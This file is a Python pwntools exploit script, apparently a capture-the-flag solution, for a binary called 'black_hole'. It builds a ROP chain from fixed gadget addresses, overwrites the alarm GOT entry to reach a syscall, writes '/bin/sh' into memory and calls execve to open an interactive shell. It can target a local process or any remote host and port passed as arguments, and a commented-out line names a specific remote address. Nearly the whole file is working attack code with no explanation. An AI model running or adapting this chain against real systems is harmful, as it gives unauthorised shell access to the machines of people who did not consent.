#/usr/env/bin python
from pwn import *
import time
gadgets1 = 0x4007AA 
gadgets2 = 0x400790 
def hole(io,msg):
    sleep(0.5)
    io.send('2333'+'A'*(0x20-4))
    sleep(0.5)
    io.send('A'*0x10+msg+p64(0x400704))
def exploit():
    payload = []
    payload.append(p64(gadgets1))
    payload.append(p64(0))
    payload.append(p64(1))
    payload.append(p64(elf.got['read']))
    payload.append(p64(1))
    payload.append(p64(elf.got['alarm']))
    payload.append(p64(0))
    payload.append(p64(gadgets2))
    for i in range(7):
        payload.append(p64(0))
    payload.append(p64(gadgets1))
    payload.append(p64(0))
    payload.append(p64(1))
    payload.append(p64(elf.got['read']))
    payload.append(p64(0x3B))
    payload.append(p64(0x601070))
    payload.append(p64(0))   #rax=0x38
    payload.append(p64(gadgets2))
    payload.append(p64(0))
    payload.append(p64(0))
    payload.append(p64(1))
    payload.append(p64(0x601078))
    payload.append(p64(0))
    payload.append(p64(0))
    payload.append(p64(0x601070))
    payload.append(p64(gadgets2))
    #for char in xrange(0x45,0x46):
        #io = process('./black_hole')
        #io = remote('106.75.66.195',11003)
    i = len(payload)
    for msg in reversed(payload): 
        log.info(i)
        i = i-1
        hole(io,str(msg))
    
    #raw_input('Go?')
    sleep(0.5)
    io.send('2333'+'A'*(0x20-4))
    sleep(0.5)
    #raw_input('Go?')
    io.send('A'*0x18+p64(0x4006CB))
    sleep(0.5)
    #raw_input('Go?')
    #log.info('Trying {0}'.format(str(char)))
    io.send(chr(0x45))
    #raw_input('Go?')
    content = "/bin/sh\x00"
    content += p64(elf.plt['alarm'])
    content = content.ljust(0x3b,'A')
    sleep(0.5)
    io.send(content)
    #io.sendline('ls')
    #try:
    io.interactive()
    #except:
    io.close()
    #else:
    #   continue 
#def test():
#    exploit()
if __name__ == '__main__':
    context.binary = './black_hole'
    context.log_level = 'debug'
    context.terminal = ['tmux','sp','-h']
    elf = ELF('./black_hole')
    #test()
    if len(sys.argv)>2:
        io = remote(sys.argv[1],sys.argv[2])
        exploit()
    else:
        io = process('./black_hole')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        exploit()